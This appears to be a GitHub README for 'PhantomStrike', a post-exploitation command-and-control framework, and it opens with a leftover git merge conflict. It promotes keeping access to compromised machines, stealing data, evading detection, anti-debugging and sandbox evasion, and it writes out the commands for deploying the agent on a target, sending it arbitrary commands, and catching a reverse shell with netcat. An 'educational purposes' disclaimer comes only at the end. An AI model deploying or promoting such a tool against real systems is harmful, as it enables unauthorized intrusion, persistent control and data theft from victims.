<<<<<<< HEAD

PhantomStrike - Stealth C2 Framework


---

██████╗ ██╗  ██╗ █████╗ ███╗   ███╗████████╗ ██████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║╚══██╔══╝██╔═══██╗██╔════╝
██████╔╝███████║███████║██╔████╔██║   ██║   ██║   ██║███████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║   ██║   ██║   ██║╚════██║
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║   ╚██████╔╝███████║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝    ╚═════╝ ╚══════╝

>>>>>>> cb039823b25ec3484ad5c066e8ba90cd8945d745
PhantomStrike - Stealth C2 Framework

██████╗ ██╗  ██╗ █████╗ ███╗   ███╗ ████████╗ ███████╗
██╔══██╗██║  ██║██╔══██╗████╗ ████║ ╚══██╔══╝ ██╔════╝
██████╔╝███████║███████║██╔████╔██║    ██║    █████╗
██╔═══╝ ██╔══██║██╔══██║██║╚██╔╝██║    ██║    ██╔══╝
██║     ██║  ██║██║  ██║██║ ╚═╝ ██║    ██║    ███████╗
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝    ╚═╝    ╚══════╝

PhantomStrike - Stealth C2 Framework 🚀

PhantomStrike is an advanced post-exploitation framework designed to provide stealth, persistence, privilege escalation, and remote control capabilities. It helps to maintain full access to compromised machines and exfiltrate valuable data while evading detection.


---
![GitHub last commit](https://img.shields.io/github/last-commit/Akkaiaj/PhantomStrike)
![GitHub issues](https://img.shields.io/github/issues/Akkaiaj/PhantomStrike)
![GitHub stars](https://img.shields.io/github/stars/Akkaiaj/PhantomStrike)
![GitHub license](https://img.shields.io/github/license/Akkaiaj/PhantomStrike)





Features 🔧

AES Encryption: Secure all communications between the agent and the C2 server.

Stealth Mode: Ensures no execution traces are left behind.

Anti-Debugging: Detects debuggers and terminates itself to prevent analysis.

Reverse Shell: Gain full control of the target system remotely.

Fileless Execution: Executes payloads entirely in memory, leaving no traces on the disk.

Self-Delete: The agent deletes itself after execution to prevent detection.

Persistence Mode: Ensures that access is maintained even after system reboots.

Command Execution: Run arbitrary shell commands on the compromised machine.

Reverse Shell Connection: Establish an interactive reverse shell with the target.



---

Installation 📌

1️⃣ Clone the Repository:

git clone https://github.com/Akkaiaj/PhantomStrike.git
cd PhantomStrike

2️⃣ Install Dependencies:

Ensure that you have all required libraries installed:

pip install -r requirements.txt


---

Usage 🚀

1️⃣ Start the C2 Server (Attacker Machine)

Run the following command to start the PhantomStrike C2 server on your machine:

python3 phantom_c2.py

📌 This command will launch the Flask-based C2 server and start listening for incoming agent connections.


---

2️⃣ Deploy the Agent (Target Machine)

To deploy the agent on a compromised system, simply run:

python3 phantom_agent.py

📌 This will:

Connect the agent to the C2 server.

Execute commands sent from the C2 server.

Open a reverse shell for remote control.



---

Command & Control 🛠️

1️⃣ Sending Commands to the Agent

From the C2 server, you can send commands to the connected agent by sending a POST request:

curl -X POST http://your-server-ip:5000/command -H "Content-Type: application/json" -d '{"command": "whoami"}'

📌 The agent will execute the given command and send the results back to the C2 server.


---

2️⃣ Reverse Shell Usage 🔥

Once the agent is connected, establish a reverse shell by running:

nc -lvnp 4444

📌 This will give you full control over the target system.


---

Evasion & Persistence 🕵️‍♂️

Anti-Debugging: PhantomStrike detects when debuggers are present and terminates to avoid analysis.

Self-Delete: The agent cleans up after execution, leaving no traces on the disk.

Persistence Mode: PhantomStrike can be configured to run automatically after system reboots, ensuring continuous access.



---

Defensive Measures 🛡️

AES Encryption: All communication between the agent and C2 server is encrypted to avoid detection.

Evasion: The tool implements polymorphic obfuscation to make the payload harder to detect by sandboxing or monitoring tools.

Anti-Sandbox: PhantomStrike bypasses common sandbox detection mechanisms.



---

Donations 💰

If you find PhantomStrike useful, consider supporting the project to help fund its continuous development:


*buy me a coffe 

BTC: bc1q0ruwrc4gs465xvu6tcn24h62pclt96sh2yv8pq

ETH: 0x69B6F3aA9F470d4cBD93CDC4c0A887C0787CEf9B

SOL: Gk6CmvvS6fi1Nfnu7QEEneshbLkmaE5Ue8sBzxz91D3q


---

License 📜

PhantomStrike is open-source software and licensed under the MIT License. By using this tool, you agree to the terms of this license.


---

⚠️ Disclaimer

This tool is intended for educational purposes and ethical hacking only. Any unauthorized use of this tool against systems without consent is illegal and unethical. Please ensure you have permission to use this tool before deploying it.


---

